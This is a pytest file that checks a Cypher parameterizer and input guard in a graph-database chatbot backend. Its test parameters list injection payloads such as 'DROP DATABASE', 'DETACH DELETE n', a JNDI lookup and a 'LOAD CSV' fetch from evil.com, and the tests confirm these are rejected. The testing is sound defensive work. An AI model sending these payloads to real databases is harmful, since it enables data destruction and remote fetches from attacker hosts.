"""Cypher injection and query-bounds tests (plan section 7, row 2)."""
from __future__ import annotations

import pytest

from app.core.config import settings
from app.core.exceptions import SecurityViolationError
from app.core.security import CypherParameterizer
from app.core.tenant_schema import MOVIES_SCHEMA, is_safe_identifier


# --------------------------------------------------------------- parameterization
def test_seed_ids_are_bound_never_interpolated():
    """The primary control: user-derived values appear only in params."""
    seeds = ["canon_inception", "canon_christopher_nolan"]
    cypher, params = CypherParameterizer.build_parameterized_traversal(
        seeds, ["DIRECTED"], max_depth=2, schema=MOVIES_SCHEMA
    )
    assert "$start_nodes" in cypher
    assert params["start_nodes"] == seeds
    for seed in seeds:
        assert seed not in cypher


def test_injection_payload_in_seed_id_stays_inert():
    """Even a hostile seed value cannot alter the query: it is bound, not concatenated."""
    hostile = "x'; DROP DATABASE tenant_movies_bot_kb; --"
    cypher, params = CypherParameterizer.build_parameterized_traversal(
        [hostile], ["DIRECTED"], max_depth=1, schema=MOVIES_SCHEMA
    )
    assert "DROP" not in cypher.upper()
    assert params["start_nodes"] == [hostile]


def test_edge_types_outside_tenant_schema_are_dropped():
    """Schema whitelisting: an attacker-supplied relationship type never reaches Cypher."""
    cypher, _ = CypherParameterizer.build_parameterized_traversal(
        ["canon_x"],
        ["DIRECTED", "EVIL_TYPE", "BUILDS_ON"],  # only DIRECTED is valid for movies
        max_depth=2,
        schema=MOVIES_SCHEMA,
    )
    assert "DIRECTED" in cypher
    assert "EVIL_TYPE" not in cypher
    assert "BUILDS_ON" not in cypher


@pytest.mark.parametrize(
    "malicious_edge",
    ["A|:B*1..99]-(x)-[", "DIRECTED`", "DIRECTED; DROP", "*", "../x", "DIRECTED OR 1=1"],
)
def test_unsafe_edge_identifiers_never_pass_the_identifier_gate(malicious_edge):
    assert not is_safe_identifier(malicious_edge)


def test_edge_fragment_is_empty_when_nothing_is_approved():
    fragment = CypherParameterizer.safe_edge_fragment(["EVIL", "ALSO_EVIL"], MOVIES_SCHEMA)
    assert fragment == ""


# --------------------------------------------------------------- input guarding
@pytest.mark.parametrize(
    "payload",
    [
        "Auth Service'; DROP DATABASE tenant_movies_bot_kb; --",
        "test'; DETACH DELETE n; --",
        "x' UNION ALL MATCH (n) RETURN n --",
        "'; CALL db.labels() --",
        "/* comment */ MATCH (n)",
        "${jndi:ldap://evil.com}",
        "LOAD CSV FROM 'http://evil.com/x.csv' AS row",
    ],
)
def test_malicious_query_text_is_rejected(payload):
    with pytest.raises(SecurityViolationError):
        CypherParameterizer.guard_user_text(payload, "user_query")


@pytest.mark.parametrize(
    "benign",
    [
        "Which films did the director of Inception make?",
        "What is a diffusion model?",
        "Who won the Best Director award in 2010?",
        "Tell me about GPT-4 vs Claude - how do they compare?",
    ],
)
def test_legitimate_queries_pass_the_guard(benign):
    assert CypherParameterizer.guard_user_text(benign, "user_query") == benign.strip()


def test_oversized_input_is_rejected():
    with pytest.raises(SecurityViolationError):
        CypherParameterizer.guard_user_text("a" * 5000, "user_query")


def test_null_byte_is_rejected():
    with pytest.raises(SecurityViolationError):
        CypherParameterizer.guard_user_text("query\x00injected", "user_query")


# --------------------------------------------------------------- traversal bounds
@pytest.mark.parametrize("requested,expected", [(1, 1), (2, 2), (3, 3), (9, 3), (0, 1), (-5, 1)])
def test_traversal_depth_is_clamped(requested, expected):
    """Plan section 2.2: max_depth <= 3, to prevent traversal explosion."""
    cypher, _ = CypherParameterizer.build_parameterized_traversal(
        ["canon_x"], ["DIRECTED"], max_depth=requested, schema=MOVIES_SCHEMA
    )
    assert f"*1..{expected}]" in cypher


def test_result_limit_is_capped():
    _, params = CypherParameterizer.build_parameterized_traversal(
        ["canon_x"], ["DIRECTED"], max_depth=2, schema=MOVIES_SCHEMA, limit=10_000
    )
    assert params["limit"] <= settings.MAX_TRAVERSAL_NODES


def test_entity_lookup_is_fully_parameterized():
    cypher, params = CypherParameterizer.build_entity_candidate_lookup(["inception", "nolan"])
    assert "$names" in cypher and "$limit" in cypher
    assert "inception" not in cypher
    assert params["names"] == ["inception", "nolan"]
